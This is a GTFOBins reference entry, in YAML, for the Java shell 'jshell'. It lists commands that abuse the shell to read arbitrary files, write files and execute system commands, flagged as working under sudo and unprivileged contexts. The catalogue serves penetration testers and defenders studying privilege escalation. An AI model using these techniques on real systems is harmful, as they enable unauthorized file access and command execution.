<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/jshell -->
---
functions:
  file-read:
  - binary: false
    code: |-
      jshell
      jshell> /open /path/to/input-file
    comment: |-
      The content is leaked as error messages.
    contexts:
      sudo:
      unprivileged:
  file-write:
  - binary: false
    code: |-
      jshell
      String x = "DATA";
      /save /path/to/output-file
    comment: |-
      Writes only the valid Java code to file.
    contexts:
      sudo:
      unprivileged:
  shell:
  - blind: true
    code: |-
      jshell
      Runtime.getRuntime().exec("/path/to/command");
    contexts:
      sudo:
      unprivileged:
...
